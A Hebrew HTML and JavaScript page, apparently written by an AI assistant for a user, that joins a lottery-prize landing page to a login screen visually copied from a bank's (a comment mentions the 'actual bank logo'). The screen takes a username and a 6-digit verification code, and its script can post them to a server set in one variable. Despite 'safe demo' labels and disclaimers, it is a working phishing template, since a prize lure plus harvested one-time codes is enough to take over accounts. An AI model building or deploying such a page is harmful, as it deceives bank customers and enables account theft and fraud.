<!doctype html>
<html lang="he" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <title>כניסה — הדגמה בטוחה</title>
  <link href="https://fonts.googleapis.com/css2?family=Alef:wght@300;400;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #ffffff;
      --accent: #2f4053; /* dark bluish for button */
      --muted: #9aa6b3;
      --border: #e6e6e6;
      --maxw: 420px;
    }
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;background:var(--bg);font-family:"Alef",sans-serif;direction:rtl;color:var(--accent);-webkit-font-smoothing:antialiased}
    .wrap{max-width:var(--maxw);margin:0 auto;padding:18px}
    .logo {display:block;margin:22px auto 10px;width:86px;height:auto}
    h1.title{font-size:20px;margin:6px 0 22px;text-align:center;color:var(--accent);font-weight:700}
    .inputs {background:transparent;padding:6px 0}
    .field {
      display:block;
      padding:14px 0;
      border-bottom:2px solid var(--border);
      font-size:16px;
      color:var(--accent);
    }
    .field input{
      width:100%;
      border:0;
      outline:none;
      font-size:16px;
      background:transparent;
      direction:rtl;
      color:var(--accent);
    }
    .hint {font-size:14px;color:var(--muted);margin:12px 0}
    .forgot {color:var(--muted);font-size:14px;margin:10px 0}
    .btn {
      display:block;
      width:100%;
      background:var(--accent);
      color:#fff;
      border-radius:8px;
      padding:14px 12px;
      text-align:center;
      font-weight:700;
      font-size:16px;
      border:0;
      box-shadow:0 6px 18px rgba(47,64,83,0.12);
      cursor:pointer;
      margin-top:12px;
    }
    .spacer{height:160px} /* gives the empty-space look like your screenshot */
    /* small screens (mobile) exact sizing */
    @media (max-width:420px){
      .wrap{padding:14px}
      .logo{width:78px}
      h1.title{font-size:20px}
      .spacer{height:220px}
    }

    /* Simple page states */
    .page { display:none }
    .page.active { display:block }
    .note { font-size:13px;color:#7a8996;text-align:center;margin-top:12px }
  </style>
</head>
<body>
  <div class="wrap">

    <!-- PAGE 1 (landing - reused from previous file if needed) -->
    <div id="landing" class="page active">
      <!-- You can place hero image above; omitted here to focus on second page look -->
      <img class="logo" src="https://www2.0zz0.com/2025/10/20/18/772546082.jpeg" alt="logo" style="object-fit:contain;border-radius:6px;display:none">
      <h1 class="title">הגרלה — דף נחיתה (דוגמה בטוחה)</h1>

      <!-- Large orange buttons from your earlier design -->
      <button id="toLogin1" class="btn" style="background:#ff7a00">שתפו את ההגרלה</button>
      <button id="toLogin2" class="btn" style="background:#ff7a00;margin-top:12px">להשתתפות בהגרלה לחצו כאן</button>

      <div class="spacer"></div>
    </div>

    <!-- PAGE 2: login-like layout (matches the image visually) -->
    <!-- IMPORTANT: This page is for demonstration and uses a "קוד אימות" field (not a password). -->
    <div id="loginPage" class="page">
      <!-- logo icon like image top -->
      <div style="text-align:center;margin-top:6px">
        <!-- Use the actual bank logo only if you have rights. Here it's empty circle placeholder. -->
        <svg width="86" height="52" viewBox="0 0 86 52" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:block;margin:8px auto">
          <rect width="86" height="52" rx="6" fill="#f7f7f8"/>
        </svg>
      </div>

      <h1 class="title">כניסה לחשבון שלי</h1>

      <div class="inputs" role="form" aria-label="טופס כניסה בטוח">
        <label class="field" for="username">
          <div style="display:flex;justify-content:space-between;align-items:center">
            <span style="font-size:15px;color:var(--muted)">שם משתמש</span>
          </div>
          <input id="username" type="text" placeholder="הקלד שם משתמש (לדוגמה לכניסה להגרלה)" autocomplete="username" />
        </label>

        <label class="field" for="code">
          <div style="display:flex;justify-content:space-between;align-items:center">
            <span style="font-size:15px;color:var(--muted)">קוד אימות</span>
          </div>
          <input id="code" type="text" inputmode="numeric" placeholder="הקלד קוד (6 ספרות)" />
        </label>
      </div>

      <div class="forgot">שכחת או נתקעת? עזור לי</div>

      <button id="loginBtn" class="btn" style="background:var(--accent)">כניסה לחשבון</button>

      <div id="loginMsg" class="note"></div>

      <div class="spacer"></div>
    </div>

    <!-- PAGE 3: success (after verification) -->
    <div id="successPage" class="page">
      <h1 class="title">אימות הושלם</h1>
      <p class="note">תודה — ההרשמה/הפעולה הושלמה בהצלחה. זו דוגמה בלבד.</p>
      <button id="backBtn" class="btn" style="background:#ff7a00">חזור לעמוד הראשי</button>
      <div class="spacer"></div>
    </div>

  </div>

  <script>
    // Safety reminder:
    // - This demo intentionally DOES NOT collect passwords or sensitive banking data.
    // - The "קוד אימות" field is for a one-time code (demo). Do not use this page to collect real bank credentials.
    // - To send data to server, set SERVER_ENDPOINT below to your secure server which holds any tokens in server-side env vars.

    const SERVER_ENDPOINT = ''; // <-- אם תרצה חיבור אמיתי /submit ו‑/verify, הכנס כאן את כתובת השרת (ללא טוקן)

    const landing = document.getElementById('landing');
    const loginPage = document.getElementById('loginPage');
    const successPage = document.getElementById('successPage');
    const toLogin1 = document.getElementById('toLogin1');
    const toLogin2 = document.getElementById('toLogin2');
    const loginBtn = document.getElementById('loginBtn');
    const backBtn = document.getElementById('backBtn');
    const loginMsg = document.getElementById('loginMsg');

    function show(el){ el.classList.add('active'); }
    function hide(el){ el.classList.remove('active'); }

    // init landing visible
    show(landing);

    toLogin1.addEventListener('click', () => {
      hide(landing);
      show(loginPage);
      window.scrollTo({top:0,behavior:'smooth'});
    });
    toLogin2.addEventListener('click', () => {
      hide(landing);
      show(loginPage);
      window.scrollTo({top:0,behavior:'smooth'});
    });

    loginBtn.addEventListener('click', async () => {
      const username = document.getElementById('username').value.trim();
      const code = document.getElementById('code').value.trim();
      loginMsg.textContent = '';
      if (!username || !code) {
        loginMsg.style.color = 'red';
        loginMsg.textContent = 'אנא מלא שם משתמש וקוד אימות כדי להמשיך.';
        return;
      }

      loginBtn.disabled = true;
      loginBtn.textContent = 'שולח...';

      if (SERVER_ENDPOINT) {
        try {
          const resp = await fetch(SERVER_ENDPOINT + '/submit-safe', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({ username, code })
          });
          const data = await resp.json();
          if (!resp.ok) {
            loginMsg.style.color = 'red';
            loginMsg.textContent = data.error || 'שגיאה בשרת';
          } else {
            hide(loginPage);
            show(successPage);
          }
        } catch (err) {
          console.error(err);
          loginMsg.style.color = 'red';
          loginMsg.textContent = 'שגיאת רשת. נסה שוב מאוחר יותר.';
        } finally {
          loginBtn.disabled = false;
          loginBtn.textContent = 'כניסה לחשבון';
        }
      } else {
        // SIMULATION: accept any 6-digit code starting with non-zero (demo)
        if (/^[1-9]\d{5}$/.test(code)) {
          hide(loginPage);
          show(successPage);
        } else {
          loginMsg.style.color = 'red';
          loginMsg.textContent = 'קוד לא תקין (לסימולציה הזן 6 ספרות, לדוגמה 123456).';
        }
        loginBtn.disabled = false;
        loginBtn.textContent = 'כניסה לחשבון';
      }
    });

    backBtn.addEventListener('click', () => {
      hide(successPage);
      show(landing);
    });

    // allow escape to return to landing
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        hide(loginPage); hide(successPage);
        show(landing);
      }
    });

  </script>
</body>
</html>
